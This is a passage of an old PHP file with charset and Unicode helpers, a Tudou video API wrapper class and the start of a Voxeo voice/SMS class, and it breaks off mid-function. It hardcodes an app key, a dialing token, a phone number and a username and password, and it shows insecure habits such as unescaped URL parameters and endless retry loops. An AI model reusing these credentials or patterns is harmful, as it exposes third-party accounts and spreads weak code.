                return preg_replace("/([^,;]+)[,]([^,;]+)[;]([^,;]+)[,]([^,;]+)[;]([^,;]+)/", "$2", trim($_SERVER['HTTP_ACCEPT_CHARSET']));
        }
				else{
					return "gb2312";
				}
}

function getheadcharset(){
                for ($i = 0;$i < count(headers_list());$i++){
                        if (stripos(arrmember(headers_list(),$i),'Content-type') >= "0"){
                                $charset = arrmember(split('[=]',arrmember(split('[:]',arrmember(headers_list(),$i)),1)),1);
                        }       
                        else    
                                $charset = "gb2312";
                }
                
                return $charset;
}
?>

<?php 
/**
 * 将字符串转换成unicode编码
 *
 * @param string $input
 * @param string $input_charset
 * @return string
 */
function str_to_unicode($input, $input_charset = 'gbk'){
 $input = iconv($input_charset, "gbk", $input);
 preg_match_all("/[\x80-\xff]?./", $input, $ar);
 $b = array_map('utf8_unicode_', $ar[0]);
 $outstr = join("", $b);
 return $outstr;
}

function utf8_unicode_($c, $input_charset = 'gbk'){
 $c = iconv($input_charset, 'utf-8', $c);
 return utf8_unicode($c);
}
// utf8 -> unicode
function utf8_unicode($c) {
 switch(strlen($c)) {
 case 1:
 return $c;
 case 2:
 $n = (ord($c[0]) & 0x3f) << 6;
 $n += ord($c[1]) & 0x3f;
 break;
 case 3:
 $n = (ord($c[0]) & 0x1f) << 12;
 $n += (ord($c[1]) & 0x3f) << 6;
 $n += ord($c[2]) & 0x3f;
 break;
 case 4:
 $n = (ord($c[0]) & 0x0f) << 18;
 $n += (ord($c[1]) & 0x3f) << 12;
 $n += (ord($c[2]) & 0x3f) << 6;
 $n += ord($c[3]) & 0x3f;
 break;
 }
 return "&#$n;";
}

/**
 * 将unicode字符转换成普通编码字符
 *
 * @param string $str
 * @param string $out_charset
 * @return string
 */
function str_from_unicode($str, $out_charset = 'gbk'){
 $str = preg_replace_callback("|&#([0-9]{1,5});|", 'unicode2utf8_', $str);
 $str = iconv("UTF-8", $out_charset, $str);
 return $str;
}

function unicode2utf8_($c){
 return unicode2utf8($c[1]);
}
function unicode2utf8($c){
 $str="";
 if ($c < 0x80) {
 $str.=$c;
 } else if ($c < 0x800) {
 $str.=chr(0xC0 | $c>>6);
 $str.=chr(0x80 | $c & 0x3F);
 } else if ($c < 0x10000) {
 $str.=chr(0xE0 | $c>>12);
 $str.=chr(0x80 | $c>>6 & 0x3F);
 $str.=chr(0x80 | $c & 0x3F);
 } else if ($c < 0x200000) {
 $str.=chr(0xF0 | $c>>18);
 $str.=chr(0x80 | $c>>12 & 0x3F);
 $str.=chr(0x80 | $c>>6 & 0x3F);
 $str.=chr(0x80 | $c & 0x3F);
 }
 return $str;
}

/**
 * 模拟JS里的unescape
 *
 * @param unknown_type $str
 * @return unknown
 */
function unescape($str) {
 $str = rawdecodeuri($str);
 preg_match_all("/(?:%u.{4})|.{4};|&#\d+;|.+/U",$str,$r);
 $ar = $r[0];
 #print_r($ar);
 foreach($ar as $k=>$v) {
 if(substr($v,0,2) == "%u")
 $ar[$k] = iconv("UCS-2","GB2312",pack("H4",substr($v,-4)));
 elseif(substr($v,0,3) == "")
 $ar[$k] = iconv("UCS-2","GB2312",pack("H4",substr($v,3,-1)));
 elseif(substr($v,0,2) == "&#") {
 echo substr($v,2,-1)."
";
 $ar[$k] = iconv("UCS-2","GB2312",pack("n",substr($v,2,-1)));
 }
 }
 return join("",$ar);
}
?> 

<?php 

// ---------------------------------------------------
//  Api.tudou.com - X3193媒体系统非标准独立类 v1.0
//  供能：实现媒体查询、播放和上传下载功能
//  实现：X3193API
//  供应：tudou.com
//  收藏：☆☆☆☆☆
//  时间：2011-06-08 12:53AM
//  行数：683行
// ---------------------------------------------------

class tudou_class{

var $appKey = '5522b8d49cf7bfd9';
var $previewer = '1';
var $forbidwords = "1";
var $closeflag = '0';

function tudouviewer(){
	return $this->previewer;
}

function tudoumediaclassid(){

                	$ch = curl_init();
                	$url = "http://api.tudou.com/v6/tool/channel?app_key=".$this->appKey."&format=json";
                	curl_setopt($ch, CURLOPT_URL, $url);
                	curl_setopt($ch, CURLOPT_HEADER, 0);
                	curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
                	curl_setopt($ch, CURLOPT_TIMEOUT, 50000);
                	$jsonstr = '';
                	while($jsonstr == ''){
                		$jsonstr = curl_exec($ch);
                	}	
                	//print_r($jsonstr);
                	//return $jsonstr;
                	$jsonstr = json_decode($jsonstr,true);
                	//return GetGB2312String($jsonstr);                	
                	//print_r($jsonstr);
                	//return $jsonstr;
                	curl_close($ch);

               	
                	$tudoumediaclassid=array();
			for($i = 0;$i <= count($jsonstr['results']);$i++){
				if($i == '0'){
					$tudoumediaclassid[$i]= array('code' => '','type' => '分类');
					continue;
				}
				$tudoumediaclassid[$i]['code'] = $jsonstr['results'][$i-1]['channelId'];
				$tudoumediaclassid[$i]['type'] = iconv('utf-8','gb2312',$jsonstr['results'][$i-1]['channelName']);
			}
	return $tudoumediaclassid;
}

function tudoumediaday(){
	$tudoumediaday[0] = array('day' => '','name' => '时间');
	$tudoumediaday[1] = array('day' => '7','name' => '7天');
	$tudoumediaday[2] = array('day' => '30','name' => '30天');	
	$tudoumediaday[3] = array('day' => '90','name' => '90天');	
	$tudoumediaday[4] = array('day' => '180','name' => '180天');	
	return $tudoumediaday;
}

function tudoumediatime(){
	$tudoumediatime[0] = array('time' => '','name' => '时长');
	$tudoumediatime[1] = array('time' => '15','name' => '短视频');
	$tudoumediatime[2] = array('time' => '60','name' => '中长视频');
	$tudoumediatime[3] = array('time' => '120','name' => '长视频');
	return $tudoumediatime;
}

function tudoumediatype(){
	$tudoumediatype[0] = array('type' => '','name' => '类型');
	$tudoumediatype[1] = array('type' => 'a','name' => '音频');
	$tudoumediatype[2] = array('type' => 'v','name' => '视频');	
	return $tudoumediatype;
}

function tudoumediaorder(){
	$tudoumediaorder[0] = array('order' => '','name' => '排序');	
	$tudoumediaorder[1] = array('order' => '','name' => '相关度');		
	$tudoumediaorder[2] = array('order' => 'createTime','name' => '发布时间');	
	$tudoumediaorder[3] = array('order' => 'viewed_all','name' => 'pv量');
	return $tudoumediaorder;
}

function tudoumedialist($keyword,$order,$page,$pagesize,$mediatype,$mediatime,$mediaday,$mediaclassid){

  						$item = '0';
  						$itemend = '0';
  						$medialist = array();
  						$page0=$page;
  						while($item < $pagesize && $itemend == '0'){
                	$ch = curl_init();
                	$url = "http://api.tudou.com/v6/video/search?app_key=".$this->appKey."&format=json&kw=".encodeuri(iconv('gb2312','utf-8',$keyword))."&pageNo=".$page."&pageSize=".$pagesize."&orderBy=".$order;
                	curl_setopt($ch, CURLOPT_URL, $url);
                	curl_setopt($ch, CURLOPT_HEADER, 0);
                	curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
                	curl_setopt($ch, CURLOPT_TIMEOUT, 50000);
               	
                	$jsonstr = '';
				    //$runtime= new runtime;
					//$_SESSION["X3193"]['global'][trim($_SERVER["SERVER_NAME"])]['runime']['teststart'] = $runtime->get_microtime();
                	
                	while($jsonstr == ''){
                		$jsonstr = curl_exec($ch);
                	}	
                	//print_r($jsonstr);
                	//return;
                	
                	$jsonstr = json_decode($jsonstr,true);
                	//print_r($jsonstr);
                	curl_close($ch);
          
          //$runtime= new runtime;
					//echo $runtime->get_microtime()-$_SESSION["X3193"]['global'][trim($_SERVER["SERVER_NAME"])]['runime']['teststart'];

						if($page-$page0>='3')	break;
							
 	      		//$medialist = array();
        		$medialist['page'] = $jsonstr['page']['pageNo'];
        		$medialist['pagesize'] = $jsonstr['page']['pageSize'];
        		$medialist['pagecount'] = $jsonstr['page']['pageCount'];
        		$medialist['totalcount'] = $jsonstr['page']['totalCount'];
        		$medialist['length'] = $medialist['totalcount'];
        		if ($medialist['pagesize'] >= $pagesize) $strpagesize = $pagesize; else $strpagesize = count($jsonstr['results']);

 						for($i=0;$i<count(split("[|]",$this->forbidwords));$i++){
 											//PRINT_R(split("[|]",$this->forbidwords));
        							if(preg_replace("/(.*)([".strtolower(arrmember(split("[|]",$this->forbidwords),$i))."])(.*)/", "$2", strtolower(trim($keyword))) == strtolower(arrmember(split("[|]",$this->forbidwords),$i))){
        								$forbidflag = '1';
        								break;
        							}	
 						}	
 						if($this->forbidflag == '1'){
 											$medialist['forbidflag'] = '1';
        							return $medialist;  							
 						}
 						elseif($this->closeflag == '1'){
 											$medialist['closeflag'] = '1';
        							return $medialist;   							
 						}
 						else{
 											$medialist['forbidflag'] = '0';
 											$medialist['closeflag'] = '0';
 						}

						//print_r($jsonstr['results']);print_r($jsonstr['page']);

        		for($i = 0;$i < $pagesize;$i++){
      			
      										if($item >= $strpagesize){
      											break;
      										}      
      													
        									if($mediaclassid == ''){
        									}
        									elseif ($mediaclassid == $jsonstr['results'][$i]['channelId']){						
        									}
        									else{		
        										//echo $item;
        										continue;
        									}
        									
        									//echo ($jsonstr['results'][$i]['totalTime']/60000).' ';
        									if($mediatime == ''){
        									}
        									elseif ($mediatime =='15' && ($jsonstr['results'][$i]['totalTime']/60000)<='15'){						
        									}
        									elseif ($mediatime =='60' && ($jsonstr['results'][$i]['totalTime']/60000)>='15' && ($jsonstr['results'][$i]['totalTime']/60000)<='60'){						
        									}
        									elseif ($mediatime =='120' && ($jsonstr['results'][$i]['totalTime']/60000)>'60'){						
        									}        									        									
        									else{		
        										//echo $item;
        										continue;
        									}

        									//echo GetGB2312String($jsonstr['results'][$i]['mediaType']);
        									if($mediatype == ''){
        									}
        									elseif ($mediatype == 'a' && GetGB2312String($jsonstr['results'][$i]['mediaType'])=='音频'){						
													}
        									elseif ($mediatype == 'v' && GetGB2312String($jsonstr['results'][$i]['mediaType'])=='视频'){						
													}
	      									else{		
        										//echo $item;
        										continue;
        									}
													        									
        									//echo (now()-strtotime($jsonstr['results'][$i]['pubDate']));
        									if($mediaday == ''){
        									}
        									elseif ($mediaday == '7' && (time()-strtotime($jsonstr['results'][$i]['pubDate']))/(3600*24)<='7'){						
        									}
        									elseif ($mediaday == '30' && (time()-strtotime($jsonstr['results'][$i]['pubDate']))/(3600*24)>'7' && (time()-strtotime($jsonstr['results'][$i]['pubDate']))/(3600*24)<='30'){						
        									}
        									elseif ($mediaday == '90' && (time()-strtotime($jsonstr['results'][$i]['pubDate']))/(3600*24)>'30' && (time()-strtotime($jsonstr['results'][$i]['pubDate']))/(3600*24)<='90'){						
        									}
        									elseif ($mediaday == '180' && (time()-strtotime($jsonstr['results'][$i]['pubDate']))/(3600*24)>'90'){						
        									}
	      									else{		
        										//echo $item;
        										continue;
        									}
													        									
		                     	$medialist[$item]['itemCode'] = GetGB2312String($jsonstr['results'][$i]['itemCode']);                		
                        	$medialist[$item]['mediatags'] = GetGB2312String($jsonstr['results'][$i]['tags']);
                        	$medialist[$item]['mediatitle'] = GetGB2312String($jsonstr['results'][$i]['title']);
                        	$medialist[$item]['mediadescription'] = GetGB2312String($jsonstr['results'][$i]['description']);
                        	$medialist[$item]['mediapicurl'] = GetGB2312String($jsonstr['results'][$i]['picUrl']);
                        	$medialist[$item]['mediatime'] = GetGB2312String($jsonstr['results'][$i]['totalTime']);
                        	$medialist[$item]['mediacreatetime'] = GetGB2312String($jsonstr['results'][$i]['pubDate']);
                        	$medialist[$item]['mediaownerid'] = GetGB2312String($jsonstr['results'][$i]['ownerId']);
                        	$medialist[$item]['mediaownername'] = GetGB2312String($jsonstr['results'][$i]['ownerName']);
                        	$medialist[$item]['mediaownernickname'] = GetGB2312String($jsonstr['results'][$i]['ownerNickname']);
                        	$medialist[$item]['mediaclass'] = GetGB2312String($jsonstr['results'][$i]['channelId']);
                        	$medialist[$item]['mediaplayerurl'] = GetGB2312String($jsonstr['results'][$i]['outerPlayerUrl']);
                        	$medialist[$item]['mediaitemurl'] = GetGB2312String($jsonstr['results'][$i]['itemUrl']);
                        	$medialist[$item]['mediatype'] = GetGB2312String($jsonstr['results'][$i]['mediaType']);
                        	$medialist[$item]['mediachecked'] = GetGB2312String($jsonstr['results'][$i]['isChecked']);
  
													//echo $item.'|'.$jsonstr['results'][$i]['totalTime']; 

        									$item = $item + 1;          									
                      	
	        	}
	        	$page = $page + 1;
	        	if($medialist['pagecount']==$medialist['page'])
	        		$itemend = '1';
					}
					$medialist['itemcount'] = $item;
               	//print_r($medialist);
        	return $medialist;   
}

function tudoumediaulist($uname,$page,$pagesize){
        	if (0){
        		$jsonstr = '{"multiPageResult":{"results":[{"description":"hh","tags":"hh,X3193","itemId":90489503,"channelId":10,"mediaType":"ff","totalTime":57000,"pubDate":"2011-07-11","title":"ff","picUrl":"http://i4.tdimg.com/034/712/799/audio_120x90.jpg","itemUrl":"http://www.tudou.com/programs/view/3qNauyuUU7M/","itemCode":"3qNauyuUU7M","ownerName":"_58605774","ownerNickname":"X3193","outerPlayerUrl":"http://www.tudou.com/v/3qNauyuUU7M/v.swf","ownerId":58605774,"picChoiceUrl":["http://i4.tdimg.com/090/489/503/m15.jpg","http://i4.tdimg.com/090/489/503/m30.jpg"],"secret":false}],"page":{"totalCount":1,"pageSize":10,"pageNo":1,"pageCount":1}}}';
	               	$jsonstr = json_decode($jsonstr,true);
	               	//print_r($jsonstr);
        	}       
        	else{   
                	$ch = curl_init();
                	$url = "http://api.tudou.com/v3/gw?method=user.item.get&appKey=".$this->appKey."&format=json&user=".($uname)."&pageNo=".$page."&pageSize=".$pagesize;
                	curl_setopt($ch, CURLOPT_URL, $url);
                	curl_setopt($ch, CURLOPT_HEADER, 0);
                	curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
                	curl_setopt($ch, CURLOPT_TIMEOUT, 50000);
                	$jsonstr = '';
                	while($jsonstr == ''){
                		$jsonstr = curl_exec($ch);
                	}	
                	//print_r($jsonstr);
                	//return;
                	$jsonstr = json_decode($jsonstr,true);
                	curl_close($ch);
        	}

        	if (0){
        		$mediaulist = array();
        		$mediaulist['page'] = $page;
        		$mediaulist['pagesize'] = $pagesize;
        		$mediaulist['pagecount'] = '';
        		$mediaulist['totalcount'] = '100';
        		$mediaulist['length'] = $mediaulist['totalcount'];
        		if ($mediaulist['length'] > $pagesize) $strpagesize = $pagesize; else $strpagesize = $mediaulist['length'];        	

        		for($i = 0;$i < $strpagesize;$i++){
                		//$objHdd = $objList->item($i);
                        	$mediaulist[$i]['itemCode'] = iconv('utf-8','gb2312','aassssssssssss');                		
                        	$mediaulist[$i]['mediatags'] = iconv('utf-8','gb2312','aaaaaaaaaaaa');
                        	$mediaulist[$i]['mediatitle'] = iconv('utf-8','gb2312','bbbbbbbbbbbbbbb');
                        	$mediaulist[$i]['mediadescription'] = iconv('utf-8','gb2312','ccccccccccccccccc');
                        	$mediaulist[$i]['mediapicurl'] = iconv('utf-8','gb2312','hhhhhhhhhhhhhh');
                        	$mediaulist[$i]['mediatime'] = iconv('utf-8','gb2312','ggggggggggggggggg');
                        	$mediaulist[$i]['mediacreatetime'] = iconv('utf-8','gb2312','jjjjjjjjjjjjjj');
                        	$mediaulist[$i]['mediaownerid'] = iconv('utf-8','gb2312','kkkkkkkkkkkkkk');
                        	$mediaulist[$i]['mediaownername'] = iconv('utf-8','gb2312','mmmmmmmmmmmmmmmmm');
                        	$mediaulist[$i]['mediaownernickname'] = iconv('utf-8','gb2312','uuuuuuuuuuuuu');
                        	$mediaulist[$i]['mediaclass'] = iconv('utf-8','gb2312','oooooooooooo');
                        	$mediaulist[$i]['mediaplayerurl'] = iconv('utf-8','gb2312','ppppppppppp');
                        	$mediaulist[$i]['mediaitemurl'] = iconv('utf-8','gb2312','yyyyyyyyyyy');
                        	$mediaulist[$i]['mediaitemid'] = iconv('utf-8','gb2312','hhhhhhhhhhhhhhhhh');
                        	$mediaulist[$i]['mediaitemcode'] = iconv('utf-8','gb2312','hhhhhhhhhhhhhhhhhhh');
                        	$mediaulist[$i]['mediatype'] = iconv('utf-8','gb2312','rrrrrrrrrrrrrrr');
                        	$mediaulist[$i]['mediasecret'] = iconv('utf-8','gb2312','rrrrrrrrrrrrrrr');
	        	}
	        	//print_r($mediaulist);
        	}       
        	else{   
        		//$objXml = new DOMDocument();  
        		//$objXml->preserveWhiteSpace = true;
        		//$objXml->async = false; 
        		//$objXml->loadXML($xmlstr);
        		//$objList = $objXml->getElementsByTagName("ItemInfo");   
	        	//echo $objList->length;                   
        		$mediaulist = array();
        		$mediaulist['page'] = iconv('utf-8','gb2312',$jsonstr['multiPageResult']['page']['pageNo']);
        		$mediaulist['pagesize'] = iconv('utf-8','gb2312',$jsonstr['multiPageResult']['page']['pageSize']);
        		$mediaulist['pagecount'] = iconv('utf-8','gb2312',$jsonstr['multiPageResult']['page']['pageCount']);
        		$mediaulist['totalcount'] = iconv('utf-8','gb2312',$jsonstr['multiPageResult']['page']['totalCount']);
        		$mediaulist['length'] = $mediaulist['totalcount'];
        		if ($mediaulist['length'] > $pagesize) $strpagesize = $pagesize; else $strpagesize = $mediaulist['length'];        	

        		for($i = 0;$i < $strpagesize;$i++){
                		//$objHdd = $objList->item($i);
                        	$mediaulist[$i]['itemCode'] = GetGB2312String($jsonstr['multiPageResult']['results'][$i]['itemCode']);                		
                        	$mediaulist[$i]['mediatags'] = GetGB2312String($jsonstr['multiPageResult']['results'][$i]['tags']);
                        	$mediaulist[$i]['mediatitle'] = GetGB2312String($jsonstr['multiPageResult']['results'][$i]['title']);
                        	$mediaulist[$i]['mediadescription'] = GetGB2312String($jsonstr['multiPageResult']['results'][$i]['description']);
                        	$mediaulist[$i]['mediapicurl'] = GetGB2312String($jsonstr['multiPageResult']['results'][$i]['picUrl']);
                        	$mediaulist[$i]['mediatime'] = GetGB2312String($jsonstr['multiPageResult']['results'][$i]['totalTime']);
                        	$mediaulist[$i]['mediacreatetime'] = GetGB2312String($jsonstr['multiPageResult']['results'][$i]['pubDate']);
                        	$mediaulist[$i]['mediaownerid'] = GetGB2312String($jsonstr['multiPageResult']['results'][$i]['ownerId']);
                        	$mediaulist[$i]['mediaownername'] = GetGB2312String($jsonstr['multiPageResult']['results'][$i]['ownerName']);
                        	$mediaulist[$i]['mediaownernickname'] = GetGB2312String($jsonstr['multiPageResult']['results'][$i]['ownerNickname']);
                        	$mediaulist[$i]['mediaclass'] = GetGB2312String($jsonstr['multiPageResult']['results'][$i]['channelId']);
                        	$mediaulist[$i]['mediaplayerurl'] = GetGB2312String($jsonstr['multiPageResult']['results'][$i]['outerPlayerUrl']);
                        	$mediaulist[$i]['mediaitemurl'] = GetGB2312String($jsonstr['multiPageResult']['results'][$i]['itemUrl']);
                        	$mediaulist[$i]['mediaitemid'] = GetGB2312String($jsonstr['multiPageResult']['results'][$i]['itemId']);
                        	$mediaulist[$i]['mediaitemcode'] = GetGB2312String($jsonstr['multiPageResult']['results'][$i]['itemCode']);
                        	$mediaulist[$i]['mediatype'] = GetGB2312String($jsonstr['multiPageResult']['results'][$i]['mediaType']);
                        	$mediaulist[$i]['mediasecret'] = GetGB2312String($jsonstr['multiPageResult']['results'][$i]['secret']);
	        	}
		}
               	//print_r($mediaulist);
        	return $mediaulist;   
}

function tudoumediaiteminfo($itemCodes){
        	if (0){
        		$jsonstr = '{"multiResult":{"results":[{"description":"test","tags":"test","alias":"","definition":0,"itemId":1000232,"ownerId":262809,"playTimes":233970,"title":"test","totalTime":20100,"pubDate":"2006-04-27","channelId":1,"bigPicUrl":"http://i1.tdimg.com/001/000/232/w.jpg","itemCode":"yg8CVootoAc","mediaType":"视频","downEnable":true,"picUrl":"http://i1.tdimg.com/001/000/232/p.jpg","itemUrl":"http://www.tudou.com/programs/view/yg8CVootoAc/","commentCount":9,"ownerName":"yumihhh","ownerNickname":"yumihhh","outerPlayerUrl":"http://www.tudou.com/v/yg8CVootoAc/v.swf","picChoiceUrl":["http://image2.tudou.com/data/imgs/i/001/000/232/m15.jpg","http://image2.tudou.com/data/imgs/i/001/000/232/m30.jpg"],"secret":false,"addPlaylistTime":""}]}}';
	               	$jsonstr = json_decode($jsonstr,true);
	               	//print_r($jsonstr);
        	}       
        	else{   
                	$ch = curl_init();
                	$url = "http://api.tudou.com/v3/gw?method=item.info.get&appKey=".$this->appKey."&format=json&itemCodes=".($itemCodes);
                	curl_setopt($ch, CURLOPT_URL, $url);
                	curl_setopt($ch, CURLOPT_HEADER, 0);
                	curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
                	curl_setopt($ch, CURLOPT_TIMEOUT, 50000);
                	$jsonstr = '';
                	while($jsonstr == ''){
                		$jsonstr = curl_exec($ch);
                	}	
                	//print_r($jsonstr);
                	//return;
                	$jsonstr = json_decode($jsonstr,true);
                	curl_close($ch);
                	//print_r($jsonstr);
                	//return;                	
        	}

        	if (0){
        		$mediainfo = array();
        		//$mediainfo['page'] = $page;
        		//$mediaulist['pagesize'] = $pagesize;
        		//$mediaulist['pagecount'] = '';
        		//$mediaulist['totalcount'] = '100';
        		//$mediaulist['length'] = $mediaulist['totalcount'];
        		//if ($mediaulist['length'] > $pagesize) $strpagesize = $pagesize; else $strpagesize = $mediaulist['length'];        	

        		//for($i = 0;$i < $strpagesize;$i++){
                		//$objHdd = $objList->item($i);
                        	$mediainfo['mediatags'] = iconv('utf-8','gb2312','aaaaaaaaaaaa');
                        	$mediainfo['mediatitle'] = iconv('utf-8','gb2312','bbbbbbbbbbbbbbb');
                        	$mediainfo['mediadescription'] = iconv('utf-8','gb2312','ccccccccccccccccc');
                        	$mediainfo['mediapicurl'] = iconv('utf-8','gb2312','hhhhhhhhhhhhhh');
                        	$mediainfo['mediatime'] = iconv('utf-8','gb2312','ggggggggggggggggg');
                        	$mediainfo['mediacreatetime'] = iconv('utf-8','gb2312','jjjjjjjjjjjjjj');
                        	$mediainfo['mediaownerid'] = iconv('utf-8','gb2312','kkkkkkkkkkkkkk');
                        	$mediainfo['mediaownername'] = iconv('utf-8','gb2312','mmmmmmmmmmmmmmmmm');
                        	$mediainfo['mediaownernickname'] = iconv('utf-8','gb2312','uuuuuuuuuuuuu');
                        	$mediainfo['mediaclass'] = iconv('utf-8','gb2312','oooooooooooo');
                        	$mediainfo['mediaplayerurl'] = iconv('utf-8','gb2312','ppppppppppp');
                        	$mediainfo['mediaitemurl'] = iconv('utf-8','gb2312','yyyyyyyyyyy');
                        	$mediainfo['mediaitemid'] = iconv('utf-8','gb2312','hhhhhhhhhhhhhhhhh');
                        	$mediainfo['mediaitemcode'] = iconv('utf-8','gb2312','hhhhhhhhhhhhhhhhhhh');
                        	$mediainfo['mediatype'] = iconv('utf-8','gb2312','rrrrrrrrrrrrrrr');
                        	$mediainfo['mediasecret'] = iconv('utf-8','gb2312','rrrrrrrrrrrrrrr');
	        	//}
	        	//print_r($mediaulist);
        	}       
        	else{   
        		//$objXml = new DOMDocument();  
        		//$objXml->preserveWhiteSpace = true;
        		//$objXml->async = false; 
        		//$objXml->loadXML($xmlstr);
        		//$objList = $objXml->getElementsByTagName("ItemInfo");   
	        	//echo $objList->length;                   
        		$mediainfo = array();
        		//$mediainfo['page'] = iconv('utf-8','gb2312',$jsonstr['page']['pageNo']);
        		//$mediainfo['pagesize'] = iconv('utf-8','gb2312',$jsonstr['page']['pageSize']);
        		//$mediainfo['pagecount'] = iconv('utf-8','gb2312',$jsonstr['multiPageResult']['page']['pageCount']);
        		//$mediainfo['totalcount'] = iconv('utf-8','gb2312',$jsonstr['multiPageResult']['page']['totalCount']);
        		//$mediainfo['length'] = $mediainfo['totalcount'];
        		//if ($mediainfo['length'] > $pagesize) $strpagesize = $pagesize; else $strpagesize = $mediainfo['length'];        	

        		//for($i = 0;$i < $strpagesize;$i++){
                		//$objHdd = $objList->item($i);
                        	$mediainfo['mediatags'] = iconv('utf-8','gb2312',$jsonstr['multiResult']['results'][0]['tags']);
                        	$mediainfo['mediatitle'] = iconv('utf-8','gb2312',$jsonstr['multiResult']['results'][0]['title']);
                        	$mediainfo['mediadescription'] = iconv('utf-8','gb2312',$jsonstr['multiResult']['results'][0]['description']);
                        	$mediainfo['mediapicurl'] = iconv('utf-8','gb2312',$jsonstr['multiResult']['results'][0]['picUrl']);
                        	$mediainfo['mediatime'] = iconv('utf-8','gb2312',$jsonstr['multiResult']['results'][0]['totalTime']);
                        	$mediainfo['mediacreatetime'] = iconv('utf-8','gb2312',$jsonstr['multiResult']['results'][0]['pubDate']);
                        	$mediainfo['mediaownerid'] = iconv('utf-8','gb2312',$jsonstr['multiResult']['results'][0]['ownerId']);
                        	$mediainfo['mediaownername'] = iconv('utf-8','gb2312',$jsonstr['multiResult']['results'][0]['ownerName']);
                        	$mediainfo['mediaownernickname'] = iconv('utf-8','gb2312',$jsonstr['multiResult']['results'][0]['ownerNickname']);
                        	$mediainfo['mediaclass'] = iconv('utf-8','gb2312',$jsonstr['multiResult']['results'][0]['channelId']);
                        	$mediainfo['mediaplayerurl'] = iconv('utf-8','gb2312',$jsonstr['multiResult']['results'][0]['outerPlayerUrl']);
                        	$mediainfo['mediaitemurl'] = iconv('utf-8','gb2312',$jsonstr['multiResult']['results'][0]['itemUrl']);
                        	$mediainfo['mediaitemid'] = iconv('utf-8','gb2312',$jsonstr['multiResult']['results'][0]['itemId']);
                        	$mediainfo['mediaitemcode'] = iconv('utf-8','gb2312',$jsonstr['multiResult']['results'][0]['itemCode']);
                        	$mediainfo['mediatype'] = iconv('utf-8','gb2312',$jsonstr['multiResult']['results'][0]['mediaType']);
                        	$mediainfo['mediasecret'] = iconv('utf-8','gb2312',$jsonstr['multiResult']['results'][0]['secret']);
	        	//}
					}
          //print_r($mediainfo);
        	return $mediainfo;   
        	
}

function tudoumediaupload($uname,$pwd,$content,$tags,$title,$channelId,$file){

          $url = "http://api.tudou.com/v3/gw?method=item.upload&appKey=5522b8d49cf7bfd9&content=".encodeuri(iconv('gb2312','utf-8',$content))."&tags=".encodeuri(iconv('gb2312','utf-8',$tags))."&channelId=".trim($channelId)."&title=".encodeuri(iconv('gb2312','utf-8',$title)); 
          $postdata = '';
          $header[] = "Content-type: application/json; charset=utf-8";
          $header[] = "Content-length: ".strlen($postdata);
          $ch = curl_init();
          curl_setopt($ch, CURLOPT_URL, $url);
          curl_setopt($ch, CURLOPT_HEADER, 0);
          curl_setopt($ch, CURLOPT_CUSTOMREQUEST,'POST');
          curl_setopt($ch, CURLOPT_USERPWD, $uname.':'.$pwd);
          curl_setopt($ch, CURLOPT_HTTPHEADER, $header);                  
          curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
          curl_setopt($ch, CURLOPT_TIMEOUT, 10000);
          curl_setopt($ch, CURLOPT_POST, 1);
          curl_setopt($ch, CURLOPT_POSTFIELDS, $postdata);
          $jsonstr = curl_exec($ch);
          $jsoncode = curl_getinfo($ch,CURLINFO_HTTP_CODE);
          curl_close($ch);
          //print_r($uname.':'.$pwd);
          //print_r(iconv('utf-8','gb2312',$jsonstr).':'.$jsoncode);
          $jsonarray = json_decode($jsonstr,true);
         	$url = $jsonarray['itemUploadInfo']['uploadUrl']; 
         	$filename = time()."_".basename($file['mediapath']['name']);//.'_'.time().'.'.geturlinfo(httppathdir()."/tmp/".basename($_FILES['mediapath']['name']),"ext");
         	copy($file['mediapath']['tmp_name'], "./tmp/".$filename);
          //$ch = curl_init();
          //curl_setopt($ch, CURLOPT_URL, trim(httppathdir()."/tmp/".$filename));
          //curl_setopt($ch, CURLOPT_HEADER, 0);
          //curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
          //curl_setopt($ch, CURLOPT_BINARYTRANSFER, 1);
          //curl_setopt($ch, CURLOPT_TIMEOUT, 10000);
          //$xmlstr = curl_exec($ch);
                    //echo $xmlstr;          
          //curl_close($ch);         	
 					$postdata = array(
													"file"  => "@"."tmp/".$filename
												);
         	$header[] = "Content-type: application/x-www-form-urlencoded";
         	$header[] = "Content-length: ".strlen($postdata);
         	//$header[] = $postdata;

         	$ch = curl_init();
         	curl_setopt($ch, CURLOPT_URL, $url);
         	curl_setopt($ch, CURLOPT_HEADER, 0);
         	curl_setopt($ch, CURLOPT_CUSTOMREQUEST,'POST');
         	curl_setopt($ch, CURLOPT_HTTPHEADER, $header);    
         	curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
         	curl_setopt($ch, CURLOPT_TIMEOUT, 150000);
         	curl_setopt($ch, CURLOPT_POST, 1);
         	curl_setopt($ch, CURLOPT_POSTFIELDS, $postdata);
         	$jsonstr = curl_exec($ch);
         	curl_close($ch);
         	//print_r(iconv('utf-8','gb2312',$jsonstr).':'.$jsoncode);
		      //print_r($jsonstr);
		       
        	$pathinfo = parse_url(trim(httppathdir()."/tmp/".$filename));
        	if($pathinfo['host'] == $_SERVER['SERVER_NAME'])
               		unlink('./tmp/'.geturlinfo(trim(httppathdir()."/tmp/".$filename),"filename"));

					//$jsonstr = '{"files":[{"storePath":"\/tudou\/2\/web_up\/110711\/58605774_64.120.224.50_BDdDZ6PcaXHF6RuTzy7OaTJfL8nY0Hyj","name":"BladeDSCampaign.mp3","md5":"06857fb42bd238ad8fdcf419d456d9ba","contentType":"application\/octet-stream","size":920219}],"fields":[]}';
        	//print_r($filename);
        	$jsonstr = json_decode($jsonstr,true);
               		
					return $jsonstr;
}

}
?>

<?php 

// ----------------------------------------------------------------
//  Evolution.voxeo.com - X3193语音和英文短信系统非标准独立类 v1.1
//  供能：实现英文语音和英文短信收发
//  实现：X3193API
//  供应：voxeo.com
//  收藏：☆☆☆☆☆
//  时间：2011-7-27 11:34AM
//  行数：45行
// ----------------------------------------------------------------
//  更新日志：
// ----------------------------------------------------------------

class voxeo_class{

var $botkey = '524883';
var $usernumber = '+12025242567';
var $OutboundDialingtoken = 'acfa26853aa07c4698004bec3aabf526ffe78951af341a43020a8a66e49acdbe0b57a1269e9bffff3865a319';
var $clientdialnumber = '14074181800';
var $voxeouser = 'x3193';
var $voxeopwd = 'EUIfgwe7';

function OutboundDialing($Calledid) {
